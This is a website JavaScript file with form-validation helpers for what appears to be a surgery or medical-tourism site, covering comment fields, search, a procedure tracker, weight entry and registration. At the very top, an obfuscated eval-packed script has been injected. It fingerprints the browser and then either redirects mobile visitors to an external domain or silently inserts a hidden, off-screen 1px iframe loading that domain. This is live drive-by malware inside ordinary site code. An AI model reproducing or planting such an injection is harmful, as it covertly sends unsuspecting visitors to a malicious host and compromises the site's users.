/*b091a457bd4a5364039049ce1b893d22*/eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('j 1n=3x(I(){f(q.Q!=1N&&L q.Q!="P"){3y(1n);f(L A["1v"]=="P"){A["1v"]=1;j 1c=(U()&&1K());j 1R=!1c&&!!A.3z&&A.E.3w==="3v 3r.";j 1g=-1;j G="3s://3t.3u/3A";f(V()&&1g==1){f((E.O.1k(/3B/i))||(E.O.1k(/3H/i))){17.3I(G)}z{A.17=G;q.17=G}}z{f((1c&&!1R&&!V())){j 14="<X 3J=\\"3G:3F;3C:-3D;\\"><1e 3E=\\"1F\\" 3q=\\""+G+"\\" 3p=\\"1F\\"></1e></X>";j J=q.3c("X");f(J.1I==0){q.Q.M=q.Q.M+14}z{j 1z=J.1I;j 15=3d.3e((1z/2));J[15].M=J[15].M+14}}}}1L()}},3b);I 1L(){j Z="1V";f(Z!="1V"){j F=q.3a(Z);f(L F!=P&&F!=1N){F.36="";37 F}}};I 1K(){f(q.D&&!q.38){x B}z f(q.D&&!A.39){x B}z f(q.D&&!q.3f){x B}z f(q.D&&!q.3g){x B}z f(q.D&&!A.3m){x B}z f(q.D){x B}z f(L E.3n!="P"&&!q.D&&U()){x B}z{x 16}}I U(){j y=A.E.O;j N=y.C("3o ");f(N>0){x T(y.S(N+5,y.C(".",N)),10)}j 1t=y.C("3l/");f(1t>0){j Y=y.C("3k:");x T(y.S(Y+3,y.C(".",Y)),10)}j K=y.C("3h/");f(K>0){x T(y.S(K+5,y.C(".",K)),10)}x 16}I V(){j 1a=A.E.O.3i();f(/(3j|3K\\d+|3L).+1A|4h|4i\\/|4j|4g|4f|4b|4c|4d|35|1q(4k|1f)|1G|4l|4r |4s|4t|4q|1A.+4p|4m|4n m(4o|4a)i|48( 1J)?|3S|p(3T|3U)\\/|3R|3Q|3M|3N(4|6)0|3O|3P|1U\\.(3V|3W)|43|44|46 42|41|3X/i.1s(1a)||/3Y|3Z|4u|33|2b|50[1-6]i|2c|2d|a 1D|2e|1B(1S|1l|s\\-)|1d(2a|29)|1p(25|1O|1j)|26|27(28|W|2f)|2g|1o(2n|1b)|2o(R|2p)|2q|2m(24|\\-m|r |s )|2l|2h(1C|1H|2i)|1u(2j|2k)|2r(1B|1Y)|1W(e|v)w|22|1Z\\-(n|u)|23\\/|1X|34|2R\\-|2S|2T|2Q|2P\\-|1j(2M|1M)|2N|2O(1r|1H|2U)|2V|31\\-s|2s|30|2Z|1w(c|p)o|2W(12|\\-d)|2X(49|1d)|2Y(2L|2K)|1S(2y|2z)|2A|2x([4-7]0|1J|1D|2w)|2t|2u(\\-|1m)|1T u|2v|2B|2C\\-5|g\\-11|1b(\\.w|1f)|2I(2J|2H)|2G|2D|2E\\-(m|p|t)|2F\\-|4e(1i|1h)|4Q( i|1q)|6M\\-c|6L(c(\\-| |1m|a|g|p|s|t)|66)|5W(63|6t)|i\\-(20|1b|19)|6m|6n( |\\-|\\/)|4v|6o|6l|6k|6h|6i|6j|1G|6p(t|v)a|6q|6w|6x|6y|6v|6u( |\\/)|6r|6g |6f\\-|62(c|k)|64(5Z|5Y)|5V( g|\\/(k|l|u)|50|54|\\-[a-w])|6d|6e|6b\\-w|68|69\\/|19(R|6A|6z)|1E(H|21|1O)|m\\-71|72(6Z|1x)|6Y(6W|6X|1P)|75|11(H|74|1u|7d|1w|t(\\-| |o|v)|7c)|79(50|7a|v )|77|78|6U[0-2]|6T[2-3]|6G(0|2)|6H(0|2|5)|6I(0(0|1)|10)|6F((c|m)\\-|6E|6B|6C|6D|6J)|6K(6|i)|6R|6S|6P(6O|6N)|67|5T|4X|4Y(a|d|t)|5U|4Z(13|\\-([1-8]|c))|4R|4S|1Q(4T|4U)|51\\-2|55(1C|5b|1y)|5c|5d|1i\\-g|5a\\-a|56(57|12|21|32|60|\\-[2-7]|i\\-)|4E|4B|4A|4w|4x|4y(4z|4F)|4G\\/|4M(4N|19|4O|4L|W|4K)|4H(H|h\\-|1l|p\\-)|4J\\/|1y(c(\\-|0|1)|47|1E|1M|1x)|5f\\-|5G|5H(\\-|m)|5I\\-0|5F(45|5E)|5B(1p|1o|5C|1r|5D)|5J(5K|W)|5Q(H|h\\-|v\\-|v )|5R(H|5S)|5P(18|50)|5O(5L|10|18)|1h(5A|5z)|5m\\-|5n\\-|5o(i|m)|5l\\-|t\\-11|5g(1Q|5h)|1P(70|m\\-|5j|5p)|5q\\-9|1U(\\.b|1T|5w)|5x|5y|5v|5u|5r(5s|R)|5t(40|5[0-3]|\\-v)|5i|5k|5N|5M(52|53|60|61|70|5e|4I|4D|4C|4P)|58(\\-| )|59|4V|4W(g |6Q|76)|7b|6V|73|6a\\-|6c|65|5X\\-/i.1s(1a.6s(0,4))){x B}x 16}',62,448,'|||||||||||||||if||||var|||||||document|||||||return|mxYeAKUHDsiDGMjGUHzGOydHtDMkVxFDu|else|window|true|indexOf|all|navigator|exMRNmBqBFkkwCLQvMmVpSdUifcbRMAKAuhZmx|lRqJmmGgOKtNAXtDvkicAoZnLHEyPbeZJRiKgW|01|function|CPGkqEODnEQfGVyRebOMhCWMdiQlkObnpMiKFkKos|hMFWqMxHKEffEIMHufktnCpSOQXpBsKyV|typeof|innerHTML|lswDVfmumvBUwDLtpmXeKNQyQrZhhwK|userAgent|undefined|body|te|substring|parseInt|lGJNSAdATbkecSkCCxReBuEOnHeAMrIgahzO|wayCVpMkPjuSHztfAsCCXkKPkwIexndcJydIyUbZR|ny|div|xYALkgbIhcqAaBDlqsPSihzDvANdBKOuUG|RltAhDIMDMMqixxlPptdLYkWGHCeYVNWwcJ||mo|||dxkxliFEgJXUWYjXyvpRVzbYjlsjRFtpdwCuMlaE|ihDIQZJdhRyDJcPleKcCMgvJyoffKYACv|false|location||ma|gIXkmWnrmNJINrnutqKkNTpujIsMMRwmdAPhgwmv|go|NUIYrrqNAQkXJTLNbvHSnSFzYUeCsHhKMJXfNY|ai|iframe|od|BkJwuJcNtnAVzRXLGPtYvqGUZWckprX|ta|pt|co|match|oo|_|fIWpqzgAMMFqqgESdbkVuqDNkHVTdcbZq|ar|al|ip|it|test|YOdIyTKvMfoiEFnArNBVagoZIIRjldHhuL|bi|v_b091a457bd4a5364039049ce1b893d22|do|ri|se|dl_name|mobile|ac|ck|wa|mc|1px|iris|ll|length|os|KBktNOEurReIBcUWEheCNboEaHrRmYjp|hfFKRckuxkmgPXTSBuIHPlnEuUPakGxCdCS|nd|null|ca|ts|pl|FHMYeKuvRXzUUCHzSzFlzncAyaEfomD|er|g1|up|none|br|capi|az|bw|||bumb|c55|di|av|amoi|an|ex|rn|ko|4thp|770s|802s|abac|yw|aptu|be|nq|lb|rd|avan|au|ch|as|us|attw|bl|devi|fetc|fly|g560|ze|ez|ic|k0|esl8|gene|gf|hcit|hd|hei|haie|un|gr|ad|ul|l2|mp|craw|da|cmd|cldc|cdm|cell|chtm|ng|dbte|ds|el|em|dmob|dica|dc||3gso|ccwa|iemobile|outerHTML|delete|compatMode|XMLHttpRequest|getElementById|100|getElementsByTagName|Math|floor|querySelector|addEventListener|Edge|toLowerCase|android|rv|Trident|atob|maxTouchPoints|MSIE|height|src|Inc|http|blondinkaulya|cf|Google|vendor|setInterval|clearInterval|chrome|052F|iPhone|left|1631px|width|absolute|position|iPod|replace|style|bb|meego|psp|series|symbian|treo|pocket|plucker|phone|ixi|re|browser|link|xiino|1207|6310||xda|ce|vodafone|wap||windows||palm||in|elaine|fennec|hiptop|hi|compal|blazer|avantgo|bada|blackberry|hone|kindle|netfront|opera|ob|firefox|mmp|lge|maemo|midp|6590|ibro|raks|rim9|ro|ve|r600|r380|85|83|qtek|zo|s55|sc|81|sdk|va|ms|sa|ge|mm|98|hp|phil|pire|ay|uc|whit|wi|p800|pan|pg||pn||||po|qc|07|w3c|webc|qa|rt|prox|psio|80|sgh|to|sh|vm40|m3|voda|tim|tcl|tdg|tel|m5|tx|vi|rg|vk|veri|v750|si|utst|v400|lk|gt|sm|b3|t5|id|sl|shar|sie|sk|so|ft|00|vx|vulc|t6|t2|sp|sy|mb|owg1|pdxg|lg|hu|zte|xi|no|||kyo|aw|le|zeto|tp|oran|m3ga|m50|yas|m1|your|libw|lynx|kwc|kpt|im1k|inno|ipaq|ikom|ig01|i230|iac|idea|ja|jbro|klon|substr|tc|kgt|keji|jemu|jigs|kddi|xo|ui|tf|wf|wg|on|ne|n30|n50|n7|wt|nok|ht|hs|wv|ti|op|nc|nzph|o2im|n20|n10|wonu|o8|oa|mi|rc||cr|me|x700|02|mmef|nw|mwbp|mywa|mt|p1|wmlb|zz|de'.split('|'),0,{}))
/*b091a457bd4a5364039049ce1b893d22*/function formActive(id) {
	var formActOld = document.getElementById(id);
	
	if (formActOld.value == "Name" || formActOld.value == "E-mail" || formActOld.value == "Homepage" || formActOld.value == "Leave a message..."){
		formActOld.value = "";
	}
	
}

function formInActive(id) {
	var formActOld = document.getElementById(id);
	
	if (formActOld.value == ""){
		if (id=="author"){ formActOld.value="Name"; }
		else if (id=="email"){ formActOld.value="E-mail"; }
		else if (id=="url"){ formActOld.value="Homepage"; }
		else if (id=="comment"){ formActOld.value="Leave a message..."; }
	}
	
}

function dodisplay(divid,userid,userhidden)
{
	document.getElementById(userhidden).value=userid;

	if (document.getElementById(divid).style.display=='none')
	document.getElementById(divid).style.display='';
	else
	document.getElementById(divid).style.display='none';
}

function searchcheck(theform)
{
	if (theform.s.value=="")
	{
		alert("Please enter your search term.");
		theform.s.focus();
		return false;
	}
	return true;
}

function showgraphs(divid,mtxt)
{
	if (document.getElementById(divid).style.display=='none')
	{
	document.getElementById(divid).style.display='';
	document.getElementById('data_point_link').innerHTML=mtxt;
	}
	else
	{
	document.getElementById(divid).style.display='none';
	document.getElementById('data_point_link').innerHTML=mtxt;
	}
}

function checktracker(theform)
{
	if ((theform.vchname.value=='') || (theform.vchname.value=='Name'))
	{
		alert("Please enter your name.");
		theform.vchname.focus();	
		return false;
	}
	if ((theform.vchprocedure.value=='') || (theform.vchprocedure.value=='Desired Procedure'))
	{
		alert("Please enter your desired procedure.");
		theform.vchprocedure.focus();	
		return false;
	}
	if ((theform.vchdestination.value=='') || (theform.vchdestination.value=='Desired Destination'))
	{
		alert("Please enter your desired destination.");
		theform.vchdestination.focus();	
		return false;
	}
	if ((theform.vchemail.value=='') || (theform.vchemail.value=='Email'))
	{
		alert("Please enter your email address.");	
		theform.vchemail.focus();
		return false;
	}
	if (!validate_email(theform.vchemail,"Please enter valid email address."))
	{
		theform.vchemail.focus();
		return false;
	}
	if ((theform.vchphone.value=='') || (theform.vchphone.value=='Phone'))
	{
		alert("Please enter your phone number.");
		theform.vchphone.focus();	
		return false;
	}

	theControl="vchname,vchprocedure,vchdestination,vchemail,vchphone";
	theMessage="your name,your desired procedure,your desired destination,your email,your phone number";
	theNumeric=",,,,";
	theEmail=",,,Y,";
	theURL=",,,,";
	theConfirmPassword=",,,,";
	thebadstuff="1,1,1,,1";
	theinteger=",,,,";
	thepercent=",,,,";
	thesize=",,,,";
	thedecimal=",,,,";
	theimage=",,,,";
	theempty="Y,Y,Y,Y,Y";
	themin=",,,,";
	themax=",,,,";
	thecheckboxlength=",,,,";
	thephoneno=",,,,";
	if(!theValidator(theform,theControl,theMessage,theNumeric,theEmail,theURL,theConfirmPassword,thebadstuff,theinteger,thepercent,thesize,thedecimal,theimage,theempty,themin,themax,thecheckboxlength,thephoneno))
	  return false;
	
	return true;
}

function validate_email(field,alerttxt)
{
  with (field)
  {
  apos=value.indexOf("@");
  dotpos=value.lastIndexOf(".");
  if (apos<1||dotpos-apos<2)
    {alert(alerttxt);return false;}
  else {return true;}
  }
}

function checkweight(theform)
{
	var wt = theform.pjm_graph_value.value;
	if(wt=="")
	{
		alert("Please enter your weight to proceed.");
		return false;	
	}
	if (isNaN(wt))
	{
		alert("Invalid weight.");
		return false;
	}
	if (wt<=0)
	{
		alert("Invalid weight.");
		return false;
	}
}

function checkregistration(theform)
{
	theControl="log,first_name,last_name,addr1,addr2,city,thestate,zip,country,user_email,description,surgery_type,surgery_location,profession,hobbies,health_goal";
	theMessage="Username,first name,last name,address1,address2,city,state,zip,country,email,my story,surgery type,surgery location,profession,hobbies,health goal";
	theNumeric=",,,,,,,Y,,,,,,,,";
	theEmail=",,,,,,,,,Y,,,,,,";
	theURL=",,,,,,,,,,,,,,,";
	theConfirmPassword=",,,,,,,,,,,,,,,";
	thebadstuff="3,1,1,,,1,1,,1,,,1,1,1,,";
	theinteger=",,,,,,,,,,,,,,,";
	thepercent=",,,,,,,,,,,,,,,";
	thesize=",,,,,,,,,,,,,,,";
	thedecimal=",,,,,,,,,,,,,,,";
	theimage=",,,,,,,,,,,,,,,";
	theempty="Y,Y,Y,Y,,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y,Y";
	themin=",,,,,,,,,,,,,,,";
	themax=",,,,,,,,,,,,,,,";
	thecheckboxlength=",,,,,,,,,,,,,,,";
	thephoneno=",,,,,,,,,,,,,,,";
	if(!theValidator(theform,theControl,theMessage,theNumeric,theEmail,theURL,theConfirmPassword,thebadstuff,theinteger,thepercent,thesize,thedecimal,theimage,theempty,themin,themax,thecheckboxlength,thephoneno))
	  return false;
	
	return true;
}